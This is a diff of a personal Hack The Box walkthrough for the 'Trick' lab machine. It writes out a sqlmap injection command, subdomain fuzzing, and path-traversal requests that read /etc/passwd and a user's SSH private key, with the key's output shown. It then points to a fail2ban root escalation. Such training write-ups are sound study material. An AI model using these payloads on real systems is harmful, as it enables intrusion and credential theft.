@@ -23,10 +23,13 @@ Look like it vulnerable with sql.
 
 Take a request and use it with sqlmap.
 
+- Command:
 ```sqlmap
+sqlmap 'http://preprod-payroll.trick.htb/ajax.php?action=login' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'X-Requested-With: XMLHttpRequest' -H 'Origin: http://preprod-payroll.trick.htb' -H 'Connection: keep-alive' -H 'Referer: http://preprod-payroll.trick.htb/login.php' -H 'Cookie: PHPSESSID=oa30hhodtgive7cv1v5ogdvli5' --data-raw 'username=admin&password=admin' -D payroll_db --tables
+```
+- Output:
 
-┌──(bop㉿BOP-PC)-[/mnt/e/OneDrive/Workspace/oscp-note/Hackthebox/Box/Trick]
-└─$ sqlmap 'http://preprod-payroll.trick.htb/ajax.php?action=login' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'X-Requested-With: XMLHttpRequest' -H 'Origin: http://preprod-payroll.trick.htb' -H 'Connection: keep-alive' -H 'Referer: http://preprod-payroll.trick.htb/login.php' -H 'Cookie: PHPSESSID=oa30hhodtgive7cv1v5ogdvli5' --data-raw 'username=admin&password=admin' -D payroll_db --tables
+```sqlmap
         ___
        __H__
  ___ ___[)]_____ ___ ___  {1.6.9#stable}
@@ -80,10 +83,15 @@ Table: users
 +----+-----------+---------------+------+---------+---------+-----------------------+------------+
 ```
 
+But we don't know what to do next with this credential. I am stuck here.
+Humm, take a hint at other writeup, we need to do some trick is the subdomains with `preprod`. We need to modify our `wordlists` to include the `preprod` in that. Damn that trick.
+- Command:
 ```bash
-┌──(bop㉿BOP-PC)-[/mnt/e/OneDrive/Workspace/oscp-note/Hackthebox/Box/Trick]
-└─$ ffuf -u http://trick.htb -w subdomains-top1million-5000.txt -H "Host: FUZZ.trick.htb" -fw 1697
+ffuf -u http://trick.htb -w subdomains-top1million-5000.txt -H "Host: FUZZ.trick.htb" -fw 1697
+```
+- Output:
 
+```bash
         /'___\  /'___\           /'___\
        /\ \__/ /\ \__/  __  __  /\ \__/
        \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
@@ -111,9 +119,13 @@ preprod-marketing       [Status: 200, Size: 9660, Words: 3007, Lines: 179, Durat
 ```
 
 Or Gobuster Vhost:
+- Command:
 ```bash
-┌──(bop㉿BOP-PC)-[/mnt/e/OneDrive/Workspace/oscp-note/Hackthebox/Box/Trick]
-└─$ gobuster vhost -u http://trick.htb -w subdomains-top1million-5000.txt
+gobuster vhost -u http://trick.htb -w subdomains-top1million-5000.txt
+```
+
+- Output:
+```bash
 ===============================================================
 Gobuster v3.1.0
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
@@ -132,12 +144,9 @@ Found: preprod-marketing.trick.htb (Status: 200) [Size: 9660]
 ===============================================================
 2022/10/04 22:27:36 Finished
 ===============================================================
-
-┌──(bop㉿BOP-PC)-[/mnt/e/OneDrive/Workspace/oscp-note/Hackthebox/Box/Trick]
 ```
 
-The trick here is we need to create a new wordlist, append `preprod-` to them.
-
+- Burp Request:
 
 ```Burp
 GET /index.php?page=....//....//....//....//....//....//....//etc/passwd HTTP/1.1
@@ -149,11 +158,10 @@ Accept-Encoding: gzip, deflate
 Connection: close
 Referer: http://preprod-marketing.trick.htb/
 Upgrade-Insecure-Requests: 1
-
-
 ```
 
-Output:
+- Output:
+
 ```burp
 HTTP/1.1 200 OK
 Server: nginx/1.14.2
@@ -203,10 +211,10 @@ sshd:x:118:65534::/run/sshd:/usr/sbin/nologin
 postfix:x:119:126::/var/spool/postfix:/usr/sbin/nologin
 bind:x:120:128::/var/cache/bind:/usr/sbin/nologin
 michael:x:1001:1001::/home/michael:/bin/bash
-
 ```
 
-Get the private key
+- Get the private key
+
 ```burp
 GET /index.php?page=....//....//....//....//....//....//....//home/michael/.ssh/id_rsa HTTP/1.1
 Host: preprod-marketing.trick.htb
@@ -218,6 +226,7 @@ Connection: close
 Referer: http://preprod-marketing.trick.htb/
 Upgrade-Insecure-Requests: 1
 ```
+- Output:
 
 ```burp
 HTTP/1.1 200 OK
@@ -256,14 +265,18 @@ IJhaN0D5bVMdjjFHAAAADW1pY2hhZWxAdHJpY2sBAgMEBQ==
 -----END OPENSSH PRIVATE KEY-----
 
 ```
+We use this private key to login to server.
 
 
 ```bash
 michael@trick:~$ cat user.txt
 
 ```
+# Privilege escalate
+
 
 There a `fail2ban` in sudo
+
 Follow this blog to get root.
 
 [https://youssef-ichioui.medium.com/abusing-fail2ban-misconfiguration-to-escalate-privileges-on-linux-826ad0cdafb7](https://youssef-ichioui.medium.com/abusing-fail2ban-misconfiguration-to-escalate-privileges-on-linux-826ad0cdafb7)
